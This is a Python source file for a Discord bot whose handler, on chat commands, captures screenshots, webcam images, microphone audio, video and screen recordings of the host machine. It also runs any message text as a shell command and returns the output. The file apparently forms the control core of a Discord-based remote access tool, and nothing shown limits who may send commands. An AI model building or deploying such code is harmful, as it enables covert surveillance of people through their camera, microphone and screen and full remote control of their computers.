from .nlp import get_intent
from .control import screenshot, camera, record, video, screen_record
import subprocess
from .config import load_config

config = load_config()

def register_commands(bot):
    @bot.event
    async def on_message(message):
        if message.author == bot.user:
            return
        content = message.content.lower()
        intent = get_intent(content)
        if intent == "screenshot":
            await screenshot(message.channel)
            return
        if intent == "camera":
            await camera(message.channel)
            return
        
        if intent == "audio":
            duration = 5  # Default duration
            words = content.split()
            for i, word in enumerate(words):
                if word.isdigit():
                    duration = int(word)
                    break
            await record(message.channel, duration)
            return
        
        if intent == "video":
            duration = 5  # Default duration
            words = content.split()
            for i, word in enumerate(words):
                if word.isdigit():
                    duration = int(word)
                    break
            await video(message.channel, duration)
            return
        
        if intent == "screenrecord":
            duration = 5  # Default duration
            words = content.split()
            for i, word in enumerate(words):
                if word.isdigit():
                    duration = int(word)
                    break
            await screen_record(message.channel, duration)
            return

        if intent == "run command":
            command = message.content.replace("run", "").replace("execute", "").strip()
            if command:
                try:
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    output = result.stdout if result.stdout else result.stderr
                    if len(output) > 2000:
                        output = output[:1990] + "..."
                    await message.channel.send(f"```{output}```")
                except Exception as e:
                    await message.channel.send(f"❌ Error: {e}")
            return
        await bot.process_commands(message)